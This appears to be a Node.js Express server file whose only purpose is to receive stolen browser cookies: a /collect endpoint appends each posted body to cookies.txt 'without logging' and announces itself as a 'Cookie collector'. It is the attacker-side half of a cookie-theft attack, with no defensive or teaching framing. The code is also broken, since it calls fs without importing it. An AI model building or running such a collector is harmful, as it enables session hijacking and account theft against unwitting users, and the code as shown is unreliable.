// server.js
const express = require('express');
const app = express();

app.use(express.text());

app.post('/collect', (req, res) => {
    // Store cookies without logging
    fs.appendFileSync('cookies.txt', `${new Date()}\n${req.body}\n\n`);
    res.send('');
});

app.listen(8080, () => {
    console.log('Cookie collector running');
});
